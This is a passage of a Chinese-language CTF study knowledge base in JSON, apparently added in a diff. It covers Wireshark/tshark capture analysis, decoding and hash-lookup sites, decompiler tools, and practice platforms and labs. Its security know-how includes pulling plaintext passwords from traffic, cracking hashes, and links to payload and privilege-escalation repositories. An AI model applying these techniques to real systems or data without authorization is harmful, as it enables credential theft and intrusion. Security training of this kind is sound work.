流\n```\n预期结果：包列表只剩符合条件的包，数量大幅下降。\n如果不行：过滤器红底说明语法错，检查字段名拼写（协议小写、字段用点号）；`contains` 的值要加引号。\n\n#### 第 3 步：Follow TCP Stream 看完整对话\n操作：右键任意包 → Follow → TCP Stream。\n预期结果：弹出新窗口，把这条 TCP 流里的请求和响应按顺序拼在一起显示，HTTP 登录请求里能看到明文账号密码。\n如果不行：内容乱码说明是二进制流（如图片传输），在 Stream 窗口右下角切换显示格式为 Hex/HTML 再分析。\n\n#### 第 4 步：导出 HTTP 传输的文件\n操作：菜单 File → Export Objects → HTTP，列出所有经 HTTP 传输的文件。\n预期结果：看到题目传输的图片、zip、flag.txt 等对象，Save 下来即可。\n如果不行：对象列表为空说明文件走的是其他协议，改 Export Objects 里的其他协议类型，或回到过滤器用 `tcp contains \"PK\"` 找 zip 传输流。\n\n#### 第 5 步：用 tshark 命令行快速过滤\n操作：适合批量/服务器环境，一条命令出结果。\n命令：\n```bash\ntshark -r capture.pcap -Y \"http.request.method==POST\" -T fields -e http.host -e http.request.uri\ntshark -r capture.pcap -Y \"dns\" -T fields -e dns.qry.name | sort -u\ntshark -r capture.pcap -Y 'frame contains \"flag\"'\ntshark -r capture.pcap -z conv,tcp        # 会话统计，找数据量大的流\n```\n预期结果：逐条打印符合条件的字段（URL、域名等），一眼扫出可疑目标。\n如果不行：`-Y` 后面的过滤表达式要加引号；字段名写错会提示 invalid field，对照 Wireshark 里的列名修改。\n\n#### 第 6 步：定位可疑流再深挖\n操作：先统计找出异常（大流量流、陌生 IP），再 Follow 那一条流。\n命令：\n```bash\ntshark -r capture.pcap -z io,stat,30    # 按 30 秒分段统计流量峰值\ntshark -r capture.pcap -z endpoints,tcp # 统计各 IP 的流量\n```\n预期结果：峰值时段或大流量 IP 指向关键交互（如文件下载、命令交互）。\n如果不行：流量分布看不出异常，就按关键字广撒网：`frame contains \"flag\"`、`frame contains \"key\"`、`http.request.uri contains \"=\"`。\n\n> [!tip] 抓 HTTP 登录包直接 Follow TCP Stream 看明文口令；找攻击行为就 `ip.addr` 组合 `http`，或直接搜 flag、passwd、key 关键字。\n\n> [!warn] 大 pcap 先统计缩小范围再 Follow，直接全量 Follow 会卡死且浪费时间。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 过滤器标红 | 字段名或语法错误 | 用 `http`、`tcp.port` 这类已知字段，值加引号 |\n| Follow 出来是乱码 | 该流传输的是二进制数据 | 右下角切换 Hex/HTML 视图，或换一条流 |\n| 找不到 flag 关键字 | flag 被编码或拆分传输 | 试 `frame contains` 大小写变体、base64 特征串、图片里的隐写 |\n| 包太多卡死 | 文件太大 | 先 `-z io,stat` 分段统计，再针对性过滤 |\n| 明文口令找不到 | 流量是加密的（HTTPS/SSH） | 看握手后是否有 TLS；有则需配合会话密钥或换非加密协议题 |\n\n#### 实战要点\n- 拿到 pcap 先按协议数一遍：Statistics → Protocol Hierarchy，看流量集中在哪。\n- HTTP 题 90% 靠「过滤 + Follow 流 + 导出对象」三步解决。\n- FTP/Telnet 是明文协议，直接 Follow 就能看到完整口令交互。\n- flag 常出现在 GET 参数、POST 体、DNS 查询名、图片传输文件里，四处都要查。\n- tshark 和 Wireshark 过滤语法完全一致，能写一行 tshark 就别开图形界面。"
+        }
+      ]
+    },
+    {
+      "id": "g-res",
+      "name": "在线与资源",
+      "intro": "解码站、反编译、CTF 平台",
+      "entries": [
+        {
+          "id": "online-decode",
+          "title": "在线解码与转换工具",
+          "tags": [
+            "decode",
+            "online",
+            "tool"
+          ],
+          "aliases": [
+            "解码站",
+            "在线工具"
+          ],
+          "difficulty": "easy",
+          "summary": "解码需求在线解决，收藏几个全能的就够，避免本地装一堆脚本。",
+          "content": "\n#### 这个条目的作用\n做题时最常遇到的不是「不会解」，而是「这是啥编码」。在线解码站把几百种编码/加密/哈希的识别和解码集成在一个网页里，粘贴即解，不用为每种编码装本地工具。收藏下面这几个站点，覆盖 CTF 九成解码需求。\n\n#### 前置条件\n- 能联网的浏览器。\n- 一段待识别的密文。\n- （可选）能截图/上传文件，用于二维码、图片类解码。\n\n#### 第 1 步：搭建自己的解码工具箱\n操作：把这几个站点收藏进浏览器书签文件夹「解码」。\n| 站点 | 用途 |\n|---|---|\n| dcode.fr | 解码大全：几百种编码、加密与谜题工具，带识别功能 |\n| CyberChef（gchq.github.io/CyberChef） | 可视化编解码瑞士军刀，拖拽组合 |\n| cmd5.com / somd5.com | MD5、SHA 彩虹表在线查询 |\n| crackstation.net | 哈希在线破解（大字典） |\n| 站长工具（tool.chinaz.com） | Base64、URL、时间戳等日常转换 |\n| zxing 在线二维码 | 二维码内容解码 |\n| tool.lu/timestamp | 时间戳与日期互转 |\n预期结果：书签栏出现一排解码站，随取随用。\n如果不行：个别站点打不开，用能访问的替代（dcode.fr 通常可直连，必要时用本地 CyberChef 离线版）。\n\n#### 第 2 步：用识别功能猜编码\n操作：打开 dcode.fr，粘贴密文到首页的识别工具（Identify 工具），点分析。\n预期结果：页面给出「可能是 Base64 / ROT13 / 某种密码」的候选列表及置信度，按提示点进对应工具解码。\n如果不行：识别不出说明是自定义算法或非标准编码，改用 CyberChef 的 Magic 再试（第 3 步）。\n\n#### 第 3 步：CyberChef Magic 兜底\n操作：打开 CyberChef，密文贴进 Input，拖入 Magic 模块。\n预期结果：Output 自动给出最可能的解码结果，多数常见编码一步到位。\n如果不行：Magic 解出的不是可读文本，回到 dcode.fr 按候选列表逐个手动尝试。\n\n#### 第 4 步：哈希在线查表\n操作：密文是 32 位十六进制（MD5）或 40 位（SHA1）等哈希时，去查表站。\n命令：访问 cmd5.com（或 crackstation.net），粘贴哈希，点查询。\n预期结果：直接返回明文（如 `admin`、`123456`），表示彩虹表/字典命中。\n如果不行：查不到说明明文较长或带盐，换 crackstation 大字典站再试；都不行就得本地 hashcat 跑（见 hashcat 条目）。\n\n#### 第 5 步：二维码与图片类解码\n操作：二维码截图后用 zxing 在线解码；图片右键「查看详情/属性」看 EXIF 信息。\n预期结果：二维码内容（常是 URL 或 flag）被读出；EXIF 里可能藏着作者名、GPS 坐标、备注等线索。\n如果不行：图片属性里看不到信息，说明线索不在 EXIF，转 strings/binwalk 走本地取证流程。\n\n#### 第 6 步：时间戳等日常转换\n操作：遇到一长串 10 位/13 位数字（Unix 时间戳），用 tool.lu/timestamp 或站长工具转换。\n预期结果：数字变成具体日期时间，题目常把时间点设计成生日/纪念日作为密码。\n如果不行：数字不是合法时间戳（超出范围），考虑它可能是别的数字编码（ASCII、进制转换），去 dcode.fr 试。\n\n> [!tip] 密文识别顺序固定：CyberChef Magic → dcode.fr 识别 → 哈希查表。前三步覆盖 CTF 九成解码题。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| dcode.fr 识别结果都不对 | 密文经过多重编码 | 识别出单层后把结果再喂给识别工具，循环剥 |\n| 哈希查不到明文 | 明文复杂或带盐 | 换 crackstation；或本地 hashcat + 规则变形 |\n| 站点打不开 | 网络/地区限制 | 换镜像、换同类站点，或本地装 CyberChef 离线版 |\n| 二维码解不出 | 图片模糊/损坏 | 换高清截图，用手机扫码确认内容后再录入 |\n\n#### 实战要点\n- 收藏夹固定 4 个就够：dcode.fr、CyberChef、cmd5/crackstation、时间戳工具。\n- 别把敏感/真实业务数据贴进陌生在线站——只贴题目密文。\n- 识别不出来时优先怀疑「多层编码」：Base64 → Hex → ROT13 循环剥。\n- 在线站一般只能解「标准算法」，自定义加密必须回本地逆向。"
+        },
+        {
+          "id": "decompile-tools",
+          "title": "反编译与逆向工具清单",
+          "tags": [
+            "decompile",
+            "reverse",
+            "jadx",
+            "ghidra"
+          ],
+          "aliases": [
+            "反编译",
+            "逆向"
+          ],
+          "difficulty": "medium",
+          "summary": "按语言选工具：Java 用 jadx，Python 用 uncompyle6，通用二进制用 Ghidra，一套覆盖 CTF 与实战。",
+          "content": "\n#### 这个条目的作用\n题目给你一个 APK、jar、pyc 或 ELF 程序，逆向目标通常是「看懂它的加密/校验逻辑，还原出 flag」。反编译就是把二进制/中间码翻译回接近源码的样子：APK 用 jadx 还原成 Java，pyc 用 uncompyle6 还原成 Python，exe/ELF 用 Ghidra 反编译成伪代码。按语言选对工具，事半功倍。\n\n#### 前置条件\n- 一个待分析文件（apk/jar/pyc/exe/elf）。\n- 按目标语言装好对应工具（下面每步都有安装命令）。\n- 能看懂一点 Java/Python/C 语法（反编译产物与源码有差异，但逻辑可读）。\n\n#### 第 1 步：先摸清文件类型\n操作：任何逆向题先 file 看真实格式，再决定用什么工具。\n命令：\n```bash\nfile challenge.pyc\nfile app.apk\nfile crackme\n```\n预期结果：输出标明 Python bytecode 版本 / Android package / ELF executable 等。\n如果不行：file 输出 Unknown 或 OpenPGP 等混淆类型，说明文件被处理过（加密/加壳），先搜线索或走脱壳流程。\n\n#### 第 2 步：APK 用 jadx 还原 Java 源码\n操作：安装 jadx 并反编译 APK。\n命令：\n```bash\nsudo apt install jadx        # Kali 自带\njadx -d out app.apk          # 输出到 out 目录\n# 或图形界面\njadx-gui app.apk\n```\n预期结果：out/sources 下是还原出的 .java 源码树，jadx-gui 窗口里可直接浏览；在源码里搜 `flag`、`key`、`secret` 往往直接命中。\n如果不行：源码都是空壳或只有 stub 类，说明 APK 加壳（如加固），需要先脱壳，或改用 jadx 的「Show Bytecode」看 smali 层。\n\n#### 第 3 步：Python pyc 用 uncompyle6 还原\n操作：安装并反编译 pyc。\n命令：\n```bash\npip install uncompyle6\nuncompyle6 challenge.pyc > challenge.py\ncat challenge.py\n```\n预期结果：challenge.py 是接近原始源码的 Python 代码，加密函数和 flag 拼接逻辑一目了然。\n如果不行：报 `Python version not supported` 说明 pyc 版本太新（3.9+），改用 decompyle3 或 pycdc；再不行就只能用 `dis` 模块读字节码。\n\n#### 第 4 步：通用二进制用 Ghidra\n操作：下载安装 Ghidra（NSA 开源），导入二进制。\n命令：\n```bash\n# 从 https://github.com/NationalSecurityAgency/ghidra 的 release 下载解压\n./ghidraRun        # Linux/macOS；Windows 用 ghidraRun.bat\n```\n操作：新建项目 → Import File 选二进制 → 双击打开 → 提示时选 Yes 自动分析 → 主窗口看 Decompile 视图（C 伪代码）。\n预期结果：左侧是函数列表，Decompile 面板显示 C 风格伪代码；找到 main 或加密相关函数，搜字符串引用定位 flag 处理逻辑。\n如果不行：伪代码全是 `undefined` 或看不懂，先在 Strings 窗口看字符串列表（右键字符串 → References 找交叉引用），从字符串反推逻辑。\n\n#### 第 5 步：Java jar/class 与 .NET\n操作：jar/class 用 jd-gui 或 CFR；.NET 用 dnSpy（Windows）。\n命令：\n```bash\n# jd-gui：下载 release 运行，把 jar 拖进窗口即反编译\n# CFR 命令行（jd-gui 失败时）\njava -jar cfr.jar app.jar --outputdir out\n# .NET（Windows）\ndnSpy.exe  # 打开 exe/dll 直接显示 C# 源码\n```\n预期结果：jd-gui 左侧包树点开即见 Java 源码；dnSpy 显示还原的 C# 方法体。\n如果不行：jd-gui 反编译失败换 CFR；.NET 混淆过就用 dnSpy 的编辑功能配合动态调试。\n\n#### 第 6 步：验证与动态调试\n操作：静态看不懂的关键逻辑，用 gdb（Linux ELF）或 x64dbg（Windows）动态跑。\n命令：\n```bash\ngdb ./crackme\n(gdb) break main\n(gdb) run\n(gdb) info registers\n```\n预期结果：在断点处观察寄存器/内存，对照伪代码确认逻辑；需要改流程就 set 寄存器或 patch 字节。\n如果不行：gdb 不会用就先只用静态分析——CTF 大部分题静态读懂伪代码就够出 flag，动态是补充手段。\n\n> [!tip] 逆向题先 strings 找线索再定语言选工具；遇到加密逻辑就在反编译结果里搜密钥常量（32 位 hex 或硬编码字符串）。\n\n> [!warn] 反编译产物仅供参考，混淆与优化代码会失真；关键逻辑（比较、解密）要结合动态调试验证，别盲信伪代码。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| uncompyle6 不支持该 pyc 版本 | Python 3.9+ 字节码变化 | 换 decompyle3 / pycdc |\n| jadx 只见空壳类 | APK 加壳 | 先脱壳再反编译，或看 smali 层 |\n| Ghidra 伪代码看不懂 | 函数被优化/内联 | 从 Strings 交叉引用入手，先定位 main |\n| jd-gui 反编译失败 | 字节码太新或混淆 | 换 CFR 命令行反编译 |\n| flag 搜不到 | 字符串被加密/拼接 | 搜常量、异或运算代码，动态调试断在比较处 |\n\n#### 实战要点\n- 工具按语言选：APK→jadx，pyc→uncompyle6/pycdc，ELF/exe→Ghidra，.NET→dnSpy。\n- 拿到文件先 file，别拿 jadx 硬解 exe。\n- 反编译结果里第一优先搜：`flag`、`key`、`password`、`base64`、`md5`。\n- 加密题的核心是找「输入→输出」的变换代码，读懂一段变换往往就是答案。\n- 混淆过的代码别硬读，动态调试在关键比较处下断点看寄存器。"
+        },
+        {
+          "id": "ctf-platforms",
+          "title": "CTF 平台与资源站",
+          "tags": [
+            "ctf",
+            "platform",
+            "resource"
+          ],
+          "aliases": [
+            "CTF平台",
+            "资源"
+          ],
+          "difficulty": "easy",
+          "summary": "平台刷题、靶场练手、仓库查 payload，三个方向各收藏一两个就够用。",
+          "content": "\n#### 这个条目的作用\n学 CTF 的三个刚需：刷题平台（有环境能跑题的题库）、本地靶场（自己搭起来练手的漏洞环境）、资源仓库（payload、字典、漏洞库）。把下面这些站点/仓库收藏好，从入门到实战一路够用。\n\n#### 前置条件\n- 能联网的浏览器和 GitHub 访问。\n- 本地练靶场需要 Docker 或 Linux 虚拟机（Kali 推荐）。\n- 一个用于注册的邮箱。\n\n#### 第 1 步：注册刷题平台\n操作：注册 BUUCTF（国内聚合题库，题型全、有在线环境）和攻防世界（XCTF，入门题友好）。\n命令/配置：\n```txt\nBUUCTF:  https://buuoj.cn\n攻防世界: https://adworld.xctf.org.cn\nCTFshow: https://ctf.show   （按方向分门别类，可补充）\n```\n预期结果：登录后能看到题目列表，每题有题目描述、附件下载和（BUUCTF 的）在线起环境按钮。\n如果不行：注册收不到验证邮件就换邮箱或稍后再试；个别平台要邀请码的跳过，先用 BUUCTF。\n\n#### 第 2 步：完成第一道入门题\n操作：在 BUUCTF 选一道 easy/签到题（如简单 misc 或 web 题），下载附件做题，提交 flag 格式的答案。\n预期结果：提交 `flag{...}` 后显示 Accepted/正确，题目进入已解列表。\n如果不行：flag 格式不对（大小写、花括号）会判错，仔细看题目给的前缀；不会做就看题目下的 WriteUp（题解），先模仿再独立。\n\n#### 第 3 步：搭本地漏洞靶场\n操作：用 Docker 一键起 DVWA（经典 Web 漏洞靶场），练 SQL 注入/XSS/文件上传。\n命令：\n```bash\ndocker run --rm -it -p 80:80 vulnerables/web-dvwa\n# 浏览器访问 http://127.0.0.1/，默认账号 admin / password\n```\n预期结果：浏览器打开 DVWA 登录页，登录后可切换漏洞等级（Low/Medium/High），每个漏洞有源码参考。\n如果不行：没装 Docker 先 `sudo apt install docker.io` 并启动服务；80 端口被占就把 `-p 80:80` 改成 `-p 8080:80` 后访问 8080。\n\n#### 第 4 步：专项靶场按需补\n操作：练文件上传上 Upload-Labs；练 SQL 上 SQLi-Labs；想要更多就装 Pikachu。\n命令（GitHub 拉取本地跑）：\n```bash\ngit clone https://github.com/c0ny1/upload-labs\ngit clone https://github.com/Audi-1/sqli-labs\n```\n预期结果：clone 下来按各仓库 README 放进 Web 环境（phpstudy/XAMPP）即可逐个关卡练习。\n如果不行：PHP 环境没配好就先用 DVWA 覆盖大部分漏洞类型，专项靶场等本地环境熟练了再上。\n\n#### 第 5 步：收藏 Payload 与资源仓库\n操作：把资源仓库加入书签/星标。\n| 仓库 | 内容 |\n|---|---|\n| PayloadsAllTheThings（github.com/swisskyrepo/PayloadsAllTheThings） | 全漏洞类型 payload 大全 |\n| gtfobins（gtfobins.github.io）/ LOLBAS | 提权与绕检测技巧 |\n| exploit-db（exploit-db.com）/ NVD / CNVD | 漏洞与 exp 查询 |\n| SecLists（github.com/danielmiessler/SecLists） | 目录、口令、用户名大字典 |\n预期结果：做题卡壳时能按漏洞类型翻到对应 payload/字典，Kali 本地还有一份 `/usr/share/seclists`。\n如果不行：GitHub 访问慢就找镜像或 Gitee 克隆；SecLists 太大可只 clone 子目录（sparse checkout）。\n\n#### 第 6 步：海外靶机环境（进阶）\n操作：注册 HackTheBox / TryHackMe / Vulnhub，在授权环境里打真实靶机。\n命令：Vulnhub 下载靶机 ova 导入 VirtualBox/VMware 即可；HTB/THM 用网页或 OpenVPN 连入。\n预期结果：能对隔离的靶机做完整渗透（扫描→利用→提权→拿 flag）。\n如果不行：HTB 需付费/排队就先用免费的 Vulnhub；网络连不上检查 VPN 配置文件。\n\n> [!tip] 新手路径：DVWA 本地过一遍经典漏洞 → BUUCTF 刷简单题 → 卡壳查 PayloadsAllTheThings → 进阶上 Vulnhub。\n\n> [!warn] 遵守平台规则，Vulnhub 靶机属授权环境，不要拿公共靶场做未授权扫描，更不要用靶场技术打未经授权的真实站点。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| BUUCTF 环境起不来 | 在线环境资源有限/排队 | 刷新或换时段；先做无需环境的题 |\n| DVWA 打不开 | Docker 未启动或端口冲突 | `sudo systemctl start docker`；换端口 `-p 8080:80` |\n| 提交 flag 显示错误 | 格式或大小写不对 | 按题目给的 flag{} 前缀，仔细对照抄 |\n| GitHub clone 慢 | 网络问题 | 用镜像站或代理，SecLists 用稀疏检出 |\n| WriteUp 看不懂 | 前置知识缺失 | 按题目标签回知识库对应条目补基础 |\n\n#### 实战要点\n- 刷题平台认准 BUUCTF + 攻防世界两个就够，别囤一堆账号。\n- 本地靶场优先 DVWA 一个，漏洞类型全、有源码可读。\n- PayloadsAllTheThings 是做题卡壳时的第一查询地，按漏洞类型直接翻。\n- 字典就用 Kali 自带 SecLists，路径 `/usr/share/seclists`，不用自己攒。\n- 平台题目环境和真实环境有差异，学会在本地复现题目的关键点。"
+        }
+      ]
+    }
+  ]
+}
